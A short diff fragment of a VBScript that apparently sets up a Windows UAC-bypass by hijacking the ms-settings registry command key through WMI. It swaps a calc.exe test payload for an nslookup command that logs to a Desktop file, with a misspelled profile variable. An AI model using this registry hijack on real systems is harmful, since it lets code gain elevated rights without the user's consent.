@@ -6,7 +6,7 @@ Const RegKeyPath = "Software\\Classes\\ms-settings\\shell\\open\\command"
 Const DelegateExecRegKeyName = "DelegateExecute"
 Const DelegateExecRegKeyValue = ""
 Const DefaultRegKeyName = ""
-Const DefaultRegKeyValue = "calc.exe"
+Const DefaultRegKeyValue = "nslookup google.com >> %USEPROFILE%\Desktop\DIDitWORK.txt"
 
 Const RegObjectPath = "winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv"
 Set Registry = GetObject(RegObjectPath)
